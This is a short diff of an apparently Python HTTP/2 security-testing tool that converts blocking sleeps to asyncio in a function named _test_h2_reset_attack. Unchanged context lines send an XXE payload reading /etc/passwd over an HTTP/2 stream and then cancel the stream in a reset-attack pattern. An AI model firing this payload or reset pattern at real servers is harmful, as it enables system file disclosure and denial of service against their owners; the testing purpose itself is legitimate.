@@ -16,6 +16,7 @@ IMPORTANTE: Usa a lib h2 para manipulacao correta de frames HTTP/2.
 from __future__ import annotations
 
 import argparse
+import asyncio
 import logging
 import socket
 import ssl
@@ -979,10 +980,10 @@ async def _test_h2_reset_attack(
                 end_stream=False,
             )
             sock.sendall(conn.data_to_send())
-            time.sleep(0.05)
+            await asyncio.sleep(0.05)
             conn.send_data(sid, b'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>', end_stream=True)
             sock.sendall(conn.data_to_send())
-            time.sleep(0.05)
+            await asyncio.sleep(0.05)
             conn.reset_stream(sid, h2.errors.ErrorCodes.CANCEL)
             sock.sendall(conn.data_to_send())
             results.append(HTTP2Attempt(
